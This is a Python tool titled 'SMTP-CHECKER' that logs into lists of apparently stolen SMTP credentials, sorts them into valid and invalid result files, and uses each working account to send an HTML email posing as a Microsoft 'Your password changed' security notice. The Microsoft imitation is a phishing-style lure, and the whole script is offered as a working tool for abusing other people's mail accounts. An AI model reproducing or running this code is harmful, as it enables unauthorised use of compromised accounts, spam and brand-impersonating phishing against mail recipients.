import sys,os,re,socket,binascii,time,random,threading,smtplib,os.path,string,base64,colorama,requests
import os
import smtplib
import concurrent.futures
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import time
from platform import system
from time import strftime
from colorama import *
from random import choice
from colorama import Fore,Back,init,Style
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

# Now regular ANSI codes should work, even in Windows
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
BLUE  = "\033[34m"
CYAN  = "\033[36m"
GREEN = "\033[32m"
BOLD    = "\033[m"
REVERSE = "\033[m"


os.system('cls' if os.name == 'nt' else 'clear')

def logo():
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37  ]

        x = """


░██████╗███╗░░░███╗████████╗██████╗░░░░░░░░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔════╝████╗░████║╚══██╔══╝██╔══██╗░░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
╚█████╗░██╔████╔██║░░░██║░░░██████╔╝█████╗██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
░╚═══██╗██║╚██╔╝██║░░░██║░░░██╔═══╝░╚════╝██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝██║░╚═╝░██║░░░██║░░░██║░░░░░░░░░░░╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░╚═╝░░░░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

         
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.02)
logo()


try:
    os.mkdir('Result') #createfolder
    os.getcwd()
except:
    pass


good=[]
bad=[]

toaddr = input("\n{}[!]{}Enter Your Mail {}> {}".format(r, g, o, r))
Defult = "fisom76922@wentcity.com" #it is use for protect to skip.Change this ADDRESS.

class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR
    
VALIDS = 0
INVALIDS = 0


def check(smtp):
    HOST, PORT, usr, pas = smtp.strip().split('|')
    global VALIDS, INVALIDS
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "Microsoft account password change"
        msg['From'] = usr
        msg['To'] = Defult
        msg.add_header('Content-Type', 'text/html')
        data = """
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr"> 
<head>
<style type="text/css">
 .link:link, .link:active, .link:visited {
       color:#2672ec !important;
       text-decoration:none !important;
 }

 .link:hover {
       color:#4284ee !important;
       text-decoration:none !important;
 }
</style>
<title></title>
</head>
<body>
<table dir="ltr">
      <tr><td id="i1" style="padding:0; font-family:'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; font-size:17px; color:#707070;">Microsoft account</td></tr>
      <tr><td id="i2" style="padding:0; font-family:'Segoe UI Light', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; font-size:41px; color:#2672ec;">Your password changed</td></tr>
      <tr><td id="i3" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Your password for the Microsoft account <a dir="ltr" id="iAccount" class="link" style="color:#2672ec; text-decoration:none" href="mailto:""" + usr + """"></a> """ + usr + """ was changed on 1/20/2024 1:54 PM (GMT).</td></tr>
      <tr><td id="i4" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">If this was you, then you can safely ignore this email.</td></tr>
      <tr><td id="i5" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Security info used: Authenticator app</td></tr>
      <tr><td id="i6" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Country/region: India</td></tr>
      <tr><td id="i7" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Platform: Windows</td></tr>
      <tr><td id="i8" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Browser: Chrome</td></tr>
      <tr><td id="i9" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">IP address: 107.134.37.178</td></tr>
      <tr><td id="i10" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">If this wasn't you, your account has been compromised. Please follow these steps:</td></tr>
      <tr><td id="i11" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink1" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/pw">1. Reset your password.</a></td></tr>
      <tr><td id="i12" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink4" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/Proofs/Manage">2. Review your security info.</a></td></tr>
      <tr><td id="i13" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink2" class="link" style="color:#2672ec; text-decoration:none" href="http://go.microsoft.com/fwlink/?LinkID=32435">3. Learn how to make your account more secure.</a></td></tr>
      <tr><td id="i14" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">You can also <a id="iLink3" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/SecurityNotifications/Update">opt out</a> or change where you receive security notifications.</td></tr>
      <tr><td id="i15" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Thanks,</td></tr>
      <tr><td id="i16" style="padding:0; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">The Microsoft account team</td></tr>
</table>
<div lang="en" style="margin-top:20px;margin-bottom:10px;"><a class="link" href="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy Statement</a><div style="margin-top:10px;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</div></div></body>
</html>

        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '\n[+]SMTP WORK {}{} '.format(y, smtp) + bcolors.RESET)
        good.append(smtp)
        open('Result/valid.txt', 'a+').write(smtp + "\n")
        VALIDS += 1
        os.system("title " + "[+] SMTP WORKED - VALIDS : {} , INVALIDS : {} .".format(VALIDS, INVALIDS))

    except:
        bad.append(smtp)
        INVALIDS += 1
        print(bcolors.FAIL + '\n[-]SMTP NOT WORK {}{} '.format(y, smtp) + bcolors.RESET)
        open('Result/invalid.txt', 'a+').write(smtp + "\n")



    print("{}MAIL SEND START{}...{}".format(c, g, o))
    time.sleep(2)


    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        msg = MIMEMultipart()
        msg['Subject'] = "Microsoft account password change "
        msg['From'] = usr
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        data = """
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr"> 
<head>
<style type="text/css">
 .link:link, .link:active, .link:visited {
       color:#2672ec !important;
       text-decoration:none !important;
 }

 .link:hover {
       color:#4284ee !important;
       text-decoration:none !important;
 }
</style>
<title></title>
</head>
<body>
<table dir="ltr">
      <tr><td id="i1" style="padding:0; font-family:'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; font-size:17px; color:#707070;">Microsoft account</td></tr>
      <tr><td id="i2" style="padding:0; font-family:'Segoe UI Light', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; font-size:41px; color:#2672ec;">Your password changed</td></tr>
      <tr><td id="i3" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Your password for the Microsoft account <a dir="ltr" id="iAccount" class="link" style="color:#2672ec; text-decoration:none" href="mailto:""" + usr + """"></a> """ + usr + """ was changed on 1/20/2024 1:54 PM (GMT).</td></tr>
      <tr><td id="i4" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">If this was you, then you can safely ignore this email.</td></tr>
      <tr><td id="i5" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Security info used: Authenticator app</td></tr>
      <tr><td id="i6" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Country/region: India</td></tr>
      <tr><td id="i7" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Platform: Windows</td></tr>
      <tr><td id="i8" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Browser: Chrome</td></tr>
      <tr><td id="i9" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">IP address: 107.134.37.178</td></tr>
      <tr><td id="i10" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">If this wasn't you, your account has been compromised. Please follow these steps:</td></tr>
      <tr><td id="i11" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink1" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/pw">1. Reset your password.</a></td></tr>
      <tr><td id="i12" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink4" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/Proofs/Manage">2. Review your security info.</a></td></tr>
      <tr><td id="i13" style="padding:0; padding-top:6px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;"><a id="iLink2" class="link" style="color:#2672ec; text-decoration:none" href="http://go.microsoft.com/fwlink/?LinkID=32435">3. Learn how to make your account more secure.</a></td></tr>
      <tr><td id="i14" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">You can also <a id="iLink3" class="link" style="color:#2672ec; text-decoration:none" href="https://account.live.com/SecurityNotifications/Update">opt out</a> or change where you receive security notifications.</td></tr>
      <tr><td id="i15" style="padding:0; padding-top:25px; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">Thanks,</td></tr>
      <tr><td id="i16" style="padding:0; font-family:'Segoe UI', Tahoma, Verdana, Arial, sans-serif; font-size:14px; color:#2a2a2a;">The Microsoft account team</td></tr>
</table>
<div lang="en" style="margin-top:20px;margin-bottom:10px;"><a class="link" href="https://go.microsoft.com/fwlink/?LinkId=521839">Privacy Statement</a><div style="margin-top:10px;">Microsoft Corporation, One Microsoft Way, Redmond, WA 98052</div></div></body>
</html>

        """
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        server.sendmail(usr, [msg['To']], msg.as_string())
        print(bcolors.OK + '[+]MAIL SEND SUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)

    except:
        print(bcolors.FAIL + '[-]MAIL SEND UNSUCCESSFULL {}{} '.format(y, smtp) + bcolors.RESET)





if __name__ == '__main__':
    smtps = open(input('\n{}[#]{}SMTP LISTS {}> {}'.format(r, g, o, r)), 'r').read().splitlines()
    power = int(input("{}[+]{}THREAD {}> {}".format(r, g, o, r)))

    try:
        def runer():
            os.system('cls' if os.name == 'nt' else 'clear')
            with concurrent.futures.ThreadPoolExecutor(power) as executor:
                executor.map(check, smtps)
        runer()
        print("\n\n{}[+] TOTAL VALIDS {}:{}[{}{}{}]{}".format(g, o, g, o, str(len(good)), g, o))
        print("{}[-] TOTAL INVALIDS {} :{}[{}{}{}]{}".format(r, o, r, o, str(len(bad)), r, o))
        time.sleep(3)
        print("\n\n{}     ALL CHECKED DONE{}".format(g, o))
        print("{} THNAKS FOR USING MY TOOL{}".format(g, o))

        time.sleep(10)
        sys.exit()

    except Exception as e:
        print('{}[!]  {}CTRL {}+{} C'.format(c, r, o, r))
        sys.exit()
        
        
     
